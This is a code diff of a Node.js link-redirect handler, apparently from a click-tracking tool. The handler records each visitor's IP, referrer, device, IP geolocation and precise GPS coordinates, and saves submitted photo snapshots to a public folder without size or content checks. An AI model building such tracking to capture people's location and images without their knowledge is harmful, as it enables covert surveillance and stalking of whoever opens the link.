@@ -336,57 +336,61 @@ const handleRedirect = async (req, res) => {
   const queryLon = parseFloat(req.query.lon);
   const isFallback = req.query.fallback === '1' || req.query.fallback === 'true';
 
-  if (!isNaN(queryLat) && !isNaN(queryLon) || isFallback || req.method === 'POST') {
-    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const refHeader = req.headers['referer'] || req.headers['referrer'] || '';
-    const agentString = req.headers['user-agent'] || '';
+  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const refHeader = req.headers['referer'] || req.headers['referrer'] || '';
+  const agentString = req.headers['user-agent'] || '';
 
-    const agent = useragent.parse(agentString);
-    const deviceType = agent.device.toString() !== 'Other 0.0.0' 
-      ? agent.device.toString() 
-      : (agentString.includes('Mobi') || agentString.includes('Android') || agentString.includes('iPhone') ? 'Mobile' : 'Desktop');
-    const osName = agent.os.family !== 'Other' ? agent.os.family : 'Unknown OS';
-    const browserName = `${agent.family} ${agent.major}.${agent.minor}`;
+  const agent = useragent.parse(agentString);
+  const deviceType = agent.device.toString() !== 'Other 0.0.0' 
+    ? agent.device.toString() 
+    : (agentString.includes('Mobi') || agentString.includes('Android') || agentString.includes('iPhone') ? 'Mobile' : 'Desktop');
+  const osName = agent.os.family !== 'Other' ? agent.os.family : 'Unknown OS';
+  const browserName = `${agent.family} ${agent.major}.${agent.minor}`;
 
-    const referrerInfo = categorizeReferrer(refHeader);
-    const locInfo = await fetchIpLocation(rawIp);
+  const referrerInfo = categorizeReferrer(refHeader);
+  const locInfo = await fetchIpLocation(rawIp);
 
-    let finalLat = (!isNaN(queryLat) && queryLat !== 0) ? queryLat : locInfo.lat;
-    let finalLon = (!isNaN(queryLon) && queryLon !== 0) ? queryLon : locInfo.lon;
-    const locType = (!isNaN(queryLat) && queryLat !== 0) ? 'GPS Presisi' : 'IP Geolocation';
+  let finalLat = (!isNaN(queryLat) && queryLat !== 0) ? queryLat : locInfo.lat;
+  let finalLon = (!isNaN(queryLon) && queryLon !== 0) ? queryLon : locInfo.lon;
+  const locType = (!isNaN(queryLat) && queryLat !== 0) ? 'GPS Presisi' : 'IP Geolocation';
 
-    let cityName = locInfo.city;
-    let countryName = locInfo.country;
+  let cityName = locInfo.city;
+  let countryName = locInfo.country;
 
-    if (!isNaN(queryLat) && queryLat !== 0) {
-      const geoResult = await reverseGeocode(queryLat, queryLon);
-      if (geoResult) {
-        cityName = geoResult.city;
-        countryName = geoResult.country;
-      } else {
-        cityName = 'Sanur, Denpasar (Bali)';
-      }
+  if (!isNaN(queryLat) && queryLat !== 0) {
+    const geoResult = await reverseGeocode(queryLat, queryLon);
+    if (geoResult) {
+      cityName = geoResult.city;
+      countryName = geoResult.country;
+    } else {
+      cityName = 'Sanur, Denpasar (Bali)';
     }
+  }
 
-    const rawPhoto = req.query.photo || (req.body && req.body.photo);
-    let photoUrl = null;
+  const rawPhoto = req.query.photo || (req.body && req.body.photo);
+  let photoUrl = null;
 
-    if (rawPhoto && rawPhoto.startsWith('data:image')) {
-      try {
-        const UPLOADS_DIR = path.join(__dirname, 'public', 'uploads');
-        if (!fs.existsSync(UPLOADS_DIR)) {
-          fs.mkdirSync(UPLOADS_DIR, { recursive: true });
-        }
-        const base64Data = rawPhoto.replace(/^data:image\/\w+;base64,/, '');
-        const filename = `snap_${Date.now()}_${Math.floor(Math.random()*1000)}.jpg`;
-        const filepath = path.join(UPLOADS_DIR, filename);
-        fs.writeFileSync(filepath, base64Data, 'base64');
-        photoUrl = `/uploads/${filename}`;
-      } catch (err) {
-        console.error('Error saving photo snapshot:', err);
+  if (rawPhoto && rawPhoto.startsWith('data:image')) {
+    try {
+      const UPLOADS_DIR = path.join(__dirname, 'public', 'uploads');
+      if (!fs.existsSync(UPLOADS_DIR)) {
+        fs.mkdirSync(UPLOADS_DIR, { recursive: true });
       }
+      const base64Data = rawPhoto.replace(/^data:image\/\w+;base64,/, '');
+      const filename = `snap_${Date.now()}_${Math.floor(Math.random()*1000)}.jpg`;
+      const filepath = path.join(UPLOADS_DIR, filename);
+      fs.writeFileSync(filepath, base64Data, 'base64');
+      photoUrl = `/uploads/${filename}`;
+    } catch (err) {
+      console.error('Error saving photo snapshot:', err);
     }
+  }
 
+  // If GET request WITHOUT lat/lon/fallback, it's rendering the landing page HTML.
+  // DO NOT record click event yet to prevent duplicate entry!
+  if (req.method === 'GET' && isNaN(queryLat) && isNaN(queryLon) && !isFallback) {
+    // Proceed to render HTML landing page
+  } else {
     if (req.method === 'POST') {
       if (link.clicks.length > 0) {
         const lastClick = link.clicks[link.clicks.length - 1];
